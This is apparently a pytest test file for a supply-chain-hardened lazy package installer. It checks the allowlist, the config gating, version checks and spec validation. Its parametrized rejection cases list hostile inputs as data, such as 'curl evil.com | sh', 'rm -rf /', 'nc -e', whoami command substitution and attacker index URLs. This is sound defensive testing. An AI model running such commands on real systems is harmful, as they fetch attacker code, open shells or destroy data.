"""Tests for tools.lazy_deps — the supply-chain-resilient on-demand installer.

The lazy_deps module is the architectural fix for the "one quarantined
package nukes 10 unrelated extras" problem. It exposes ``ensure(feature)``
which only installs from a strict allowlist, refuses anything that looks
like a URL / file path, runs venv-scoped, and respects the
``security.allow_lazy_installs`` config flag.

These tests cover the security boundary and the public API. The real pip
call is mocked — we never actually shell out during unit tests.
"""

from __future__ import annotations


import pytest

import tools.lazy_deps as ld


def _register_fake_feature(monkeypatch, feature: str, specs: tuple[str, ...]) -> str:
    """Register a synthetic feature + backing extra for a test.

    Specs live in pyproject.toml's ``[project.optional-dependencies]``, so a
    test feature needs both halves: an entry in ``LAZY_DEPS`` mapping it to
    an extra name, and that extra in the (cached) pyproject table. Returns the
    generated extra name.
    """
    extra = f"__test-{feature.replace('.', '-')}"
    monkeypatch.setitem(ld.LAZY_DEPS, feature, extra)
    table = dict(ld._optional_dependencies())
    table[extra] = tuple(specs)
    monkeypatch.setattr(ld, "_optional_dependencies", lambda: table)
    return extra


# ---------------------------------------------------------------------------
# Spec safety
# ---------------------------------------------------------------------------


class TestSpecSafety:
    """_spec_is_safe guards install_specs, whose specs come from a plugin.

    ``pip_dependencies`` in a plugin manifest is not ours: a user can install
    a plugin from ~/.hermes/plugins. ensure() needs no such check, because
    its specs come from the extras in pyproject.toml.

    Each spec becomes one argv entry and no caller uses shell=True, so the
    shapes that matter are the ones pip itself acts on: an index URL, a
    remote repository, or a local path.

    The package names below are invented. A real name would tie this test to
    a pin that moves.
    """

    @pytest.mark.parametrize("spec", [
        "zzzpkg",                        # bare name
        "zzzpkg==1.0.0",
        "zzzpkg>=1.0,<2",
        "zzzpkg~=1.0",
        "zzz-pkg>=2.3.0,<3",             # hyphen
        "zzz_pkg==1.0",                  # underscore
        "zzzpkg[extra]>=0.20,<1",        # extras block
        "zzzpkg>=1.2.0",                 # floor only
    ])
    def test_a_plain_requirement_is_accepted(self, spec):
        assert ld._spec_is_safe(spec), f"expected {spec!r} to be safe"

    @pytest.mark.parametrize("spec", [
        # pip reads an index that the attacker controls.
        "--index-url=http://evil/",
        "--extra-index-url=http://evil/",
        "-i http://evil/",
        # pip reads a file the attacker names.
        "-r requirements.txt",
        # pip fetches a repository and runs its setup.py.
        "git+https://github.com/foo/bar.git",
        "https://example.com/foo.tar.gz",
        "zzzpkg @ https://example.com/foo.whl",
        # pip installs a local tree.
        "/etc/passwd",
        "./local-malware",
        "../escape",
        # Not a requirement at all. Rejected by the shape rule, so a future
        # caller that does build a command line gets nothing to work with.
        "zzzpkg; rm -rf /",
        "zzzpkg && curl evil.com | sh",
        "zzzpkg`whoami`",
        "zzzpkg$(whoami)",
        "zzzpkg|nc -e",
        "zzzpkg\nsecond-line",
        "zzzpkg\rmore",
        # Empty, or long enough to be something other than a requirement.
        "",
        "   ",
        "x" * 500,
    ])
    def test_anything_that_is_not_a_plain_requirement_is_rejected(self, spec):
        assert not ld._spec_is_safe(spec), \
            f"expected {spec!r} to be rejected"

    @pytest.mark.parametrize("spec", [
        "zzzpkg==1.0 --force",   # a flag after a valid requirement
        "==1.0",                 # version with no name
        "zzz pkg==1.0",          # space inside the name
        "zzzpkg{1.0}",
        "zzzpkg!",
        "zzzpkg%20==1.0",
    ])
    def test_the_shape_rule_rejects_what_the_other_clauses_pass(self, spec):
        """The pattern match, on its own.

        Each spec here holds no metacharacter, no path and no URL, so each
        earlier clause of _spec_is_safe accepts it. Only the pattern rejects
        it. Without these cases the pattern could return True for every
        input and each other test in this class would still pass.

        The first case is the one that matters: a second argument after a
        valid requirement puts a flag of the attacker's choice on the pip
        command line.
        """
        assert not ld._spec_is_safe(spec), \
            f"expected {spec!r} to be rejected"


# ---------------------------------------------------------------------------
# Allowlist enforcement
# ---------------------------------------------------------------------------


class TestAllowlist:
    def test_unknown_feature_raises(self, monkeypatch):
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        with pytest.raises(ld.FeatureUnavailable, match="not in LAZY_DEPS"):
            ld.ensure("not.a.real.feature")


    def test_feature_install_command_unknown(self):
        assert ld.feature_install_command("not.real") is None


# ---------------------------------------------------------------------------
# allow_lazy_installs gating
# ---------------------------------------------------------------------------


class TestSecurityGating:
    def test_disabled_via_config_raises(self, monkeypatch):
        # Pretend honcho is missing AND lazy installs are disabled.
        _register_fake_feature(monkeypatch, "test.feat", ("packageX>=1.0,<2",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: False)
        monkeypatch.delenv("HERMES_DISABLE_LAZY_INSTALLS", raising=False)
        with pytest.raises(ld.FeatureUnavailable, match="lazy installs disabled"):
            ld.ensure("test.feat", prompt=False)


    def test_config_failure_fails_open(self, monkeypatch):
        # If config can't be read at all, we ALLOW installs rather than
        # blocking the user out of their own backends.
        monkeypatch.delenv("HERMES_DISABLE_LAZY_INSTALLS", raising=False)
        monkeypatch.setattr(
            "hermes_cli.config.load_config",
            lambda: (_ for _ in ()).throw(RuntimeError("config broken")),
        )
        assert ld._allow_lazy_installs() is True


# ---------------------------------------------------------------------------
# ensure() happy/sad paths
# ---------------------------------------------------------------------------


class TestEnsure:
    def test_already_satisfied_is_noop(self, monkeypatch):
        # If the package is importable, ensure() returns without calling pip.
        _register_fake_feature(monkeypatch, "test.satisfied", ("zzzfake>=1",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: True)
        # If pip were called, this would fail loudly.
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called"),
        )
        ld.ensure("test.satisfied", prompt=False)  # no exception


    def test_install_succeeds_but_still_missing_raises(self, monkeypatch):
        # Pip says success but the package still isn't importable
        # (e.g. site-packages caching, wrong python). Surface this.
        _register_fake_feature(monkeypatch, "test.cache", ("zzzfake>=1",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda specs, **kw: ld._InstallResult(True, "ok", ""),
        )
        with pytest.raises(ld.FeatureUnavailable, match="still not importable"):
            ld.ensure("test.cache", prompt=False)


# ---------------------------------------------------------------------------
# is_available
# ---------------------------------------------------------------------------


class TestIsAvailable:
    def test_unknown_feature_returns_false(self):
        assert ld.is_available("not.a.thing") is False


    def test_missing_returns_false(self, monkeypatch):
        _register_fake_feature(monkeypatch, "test.miss", ("zzzfake>=1",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        assert ld.is_available("test.miss") is False


# ---------------------------------------------------------------------------
# Version-aware _is_satisfied (Piece B — "stale pin" detection)
#
# The original implementation returned True the moment the package name
# was importable, ignoring the spec's version range. That meant pin bumps
# in the extras never propagated to users who already lazy-installed the
# backend at an older version. _is_satisfied now parses the spec and
# checks the installed version against the constraint.
# ---------------------------------------------------------------------------


class TestIsSatisfiedVersionAware:
    def _fake_version(self, monkeypatch, installed_versions: dict):
        """Patch importlib.metadata.version() inside lazy_deps."""
        from importlib.metadata import PackageNotFoundError

        def _version(pkg):
            if pkg in installed_versions:
                return installed_versions[pkg]
            raise PackageNotFoundError(pkg)

        # Patch at the import site lazy_deps uses (inside the function).
        import importlib.metadata as _md
        monkeypatch.setattr(_md, "version", _version)

    def test_exact_pin_match_returns_true(self, monkeypatch):
        self._fake_version(monkeypatch, {"honcho-ai": "2.2.0"})
        assert ld._is_satisfied("honcho-ai==2.2.0") is True


    def test_range_within_returns_true(self, monkeypatch):
        self._fake_version(monkeypatch, {"slack-bolt": "1.27.0"})
        assert ld._is_satisfied("slack-bolt>=1.18.0,<2") is True


    def test_bare_package_name_presence_is_enough(self, monkeypatch):
        # No version constraint — presence alone counts as satisfied.
        self._fake_version(monkeypatch, {"somepkg": "1.0.0"})
        assert ld._is_satisfied("somepkg") is True

    def test_extras_block_in_spec_is_stripped(self, monkeypatch):
        # mautrix[encryption]==0.21.0 — the [encryption] block must not
        # confuse the specifier parser.
        self._fake_version(monkeypatch, {"mautrix": "0.21.0"})
        assert ld._is_satisfied("mautrix[encryption]==0.21.0") is True

    def test_extras_block_mismatch_returns_false(self, monkeypatch):
        self._fake_version(monkeypatch, {"mautrix": "0.20.0"})
        assert ld._is_satisfied("mautrix[encryption]==0.21.0") is False

    def test_trace_upload_hub_at_core_locked_version_is_current(self, monkeypatch):
        """#60783 regression: refresh must not churn the shared hub install.

        huggingface-hub arrives in the venv via the core lock (transformers /
        sentence-transformers for local Hindsight, faster-whisper, tokenizers).
        With the extra's pin held in lockstep with uv.lock, the version the
        core installs satisfies the trace-upload spec, so the `hermes update`
        lazy-refresh pass reports "current" instead of reinstalling — the
        downgrade that used to break the Hindsight daemon can't happen.
        """
        spec = ld.feature_specs("tool.trace_upload")[0]
        pinned = ld._specifier_from_spec(spec).lstrip("=")
        self._fake_version(monkeypatch, {"huggingface-hub": pinned})
        assert ld._is_satisfied(spec) is True
        assert ld.feature_missing("tool.trace_upload") == ()

    def test_only_the_stale_specs_of_a_feature_are_reinstalled(self, monkeypatch):
        """ensure() repairs the stale specs and leaves the current ones.

        A feature usually shares packages with the core install or with
        another feature. Reinstalling the whole set would churn packages that
        already meet their spec, and a reinstall can move a shared transitive
        that something else depends on.

        The versions here are invented. A test that names the real pins of a
        real extra fails on each routine bump without finding a fault.
        """
        installed_versions = {
            "zzz-current": "2.0.0",   # meets its spec
            "zzz-stale": "1.0.0",     # below its spec
            # zzz-absent is not installed at all
        }
        self._fake_version(monkeypatch, installed_versions)
        _register_fake_feature(
            monkeypatch, "test.partial",
            ("zzz-current==2.0.0", "zzz-stale==1.5.0", "zzz-absent==3.0.0"),
        )
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        # Force the pip tier. uv sync would run a real subprocess, and this
        # test is about WHICH specs get repaired, not about the installer.
        monkeypatch.setattr(ld, "_uv_sync_extra", lambda _f: None)

        installed = []

        def fake_install(specs, **kwargs):
            installed.extend(specs)
            for spec in specs:
                package, wanted = spec.split("==", 1)
                installed_versions[package] = wanted
            return ld._InstallResult(True, "ok", "")

        monkeypatch.setattr(ld, "_venv_pip_install", fake_install)

        ld.ensure("test.partial", prompt=False)

        assert set(installed) == {"zzz-stale==1.5.0", "zzz-absent==3.0.0"}
        assert "zzz-current==2.0.0" not in installed


# ---------------------------------------------------------------------------
# active_features + refresh_active_features (Piece A — hermes update wiring)
# ---------------------------------------------------------------------------


class TestActiveFeatures:
    def test_no_packages_installed_returns_empty(self, monkeypatch):
        monkeypatch.setattr(ld, "_is_present", lambda spec: False)
        assert ld.active_features() == []


    def test_shared_dependency_does_not_activate_feature(self, monkeypatch):
        # asyncpg is a generic dependency that may be installed for unrelated
        # reasons. It must not make hermes update try to refresh Matrix unless
        # the Matrix anchor package (mautrix) is present.
        monkeypatch.setattr(
            ld, "_is_present",
            lambda spec: ld._pkg_name_from_spec(spec) == "asyncpg",
        )
        assert "platform.matrix" not in ld.active_features()


class TestRefreshActiveFeatures:
    def test_no_active_features_returns_empty(self, monkeypatch):
        monkeypatch.setattr(ld, "active_features", lambda: [])
        assert ld.refresh_active_features() == {}

    def test_windows_matrix_refresh_is_skipped_before_pip(self, monkeypatch):
        # Matrix E2EE pulls python-olm, which has no native Windows wheel/build
        # path. `hermes update` must not retry that doomed install every run.
        monkeypatch.setattr(ld.sys, "platform", "win32")
        monkeypatch.setattr(ld, "active_features", lambda: ["platform.matrix"])
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld,
            "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called for unsupported Matrix on Windows"),
        )

        result = ld.refresh_active_features()

        assert result["platform.matrix"].startswith("skipped:")
        assert "unsupported on Windows" in result["platform.matrix"]


    def test_mixed_results_returns_per_feature_status(self, monkeypatch):
        monkeypatch.setattr(ld, "active_features", lambda: ["a.ok", "b.fail"])
        _register_fake_feature(monkeypatch, "a.ok", ("pkga==1.0",))
        _register_fake_feature(monkeypatch, "b.fail", ("pkgb==1.0",))
        # a.ok: already satisfied → "current"
        # b.fail: missing + install fails → "failed:"
        def fake_satisfied(spec):
            return ld._pkg_name_from_spec(spec) == "pkga"
        monkeypatch.setattr(ld, "_is_satisfied", fake_satisfied)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda specs, **kw: ld._InstallResult(False, "", "nope"),
        )
        result = ld.refresh_active_features()
        assert result["a.ok"] == "current"
        assert result["b.fail"].startswith("failed:")


# ---------------------------------------------------------------------------
# install_specs — manifest-driven installs (dashboard memory providers etc.)
#
# NS-605: the dashboard's memory-provider setup endpoint used to shell out
# to `uv pip install --python sys.executable`, which fails with a permission
# error on the sealed hosted venv. install_specs routes those installs
# through the same environment-aware pipeline as ensure(): venv-scoped on
# normal installs, redirected to the durable target on immutable images,
# and cleanly refused (with a reason) when installs are gated off.
# ---------------------------------------------------------------------------


class TestInstallSpecs:
    def test_empty_specs_is_trivially_ok(self, monkeypatch):
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called"),
        )
        result = ld.install_specs([])
        assert result.ok is True
        assert result.blocked is False

    def test_blank_specs_are_ignored(self, monkeypatch):
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called"),
        )
        result = ld.install_specs(["", "   "])
        assert result.ok is True

    @pytest.mark.parametrize("bad", [
        "pkg; rm -rf /",
        "-e git+https://evil.example/repo.git",
        "https://evil.example/pkg.tar.gz",
        "../../etc/passwd",
        "pkg @ file:///tmp/x",
    ])
    def test_unsafe_specs_are_blocked_before_any_install(self, monkeypatch, bad):
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called"),
        )
        result = ld.install_specs([bad])
        assert result.ok is False
        assert result.blocked is True
        assert "unsafe spec" in result.reason

    def test_one_unsafe_spec_blocks_the_whole_batch(self, monkeypatch):
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called"),
        )
        result = ld.install_specs(["honcho-ai==2.2.0", "pkg; rm -rf /"])
        assert result.blocked is True


    def test_never_raises_on_unexpected_error(self, monkeypatch):
        monkeypatch.delenv("HERMES_DISABLE_LAZY_INSTALLS", raising=False)
        monkeypatch.delenv(ld._LAZY_TARGET_ENV, raising=False)
        monkeypatch.setattr(
            "hermes_cli.config.load_config", lambda: {}, raising=False
        )
        # Contract: install_specs never raises — even an unexpected installer
        # crash comes back as a failed result the caller can render.
        def boom(specs, **kw):
            raise RuntimeError("disk on fire")
        monkeypatch.setattr(ld, "_venv_pip_install", boom)
        result = ld.install_specs(["honcho-ai==2.2.0"])
        assert result.ok is False
        assert "disk on fire" in result.stderr
